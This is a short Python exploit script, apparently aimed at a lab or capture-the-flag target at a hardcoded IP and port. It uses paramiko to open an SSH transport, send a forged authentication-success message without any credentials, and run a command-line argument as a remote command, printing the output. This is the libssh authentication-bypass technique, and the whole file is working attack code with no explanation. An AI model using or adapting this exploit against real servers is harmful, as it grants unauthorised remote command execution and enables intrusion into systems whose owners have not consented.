#!/usr/bin/python3

import sys
import paramiko
import socket

s = socket.socket()
s.connect(("35.246.139.54",31363))
m = paramiko.message.Message()
t = paramiko.transport.Transport(s)
t.start_client()
m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
t._send_message(m)
c = t.open_session(timeout=5)
c.exec_command(sys.argv[1])
out = c.makefile("rb", 2048)
output = out.read().decode()
out.close()

for line in output.split("\n"):
    print(line.strip())
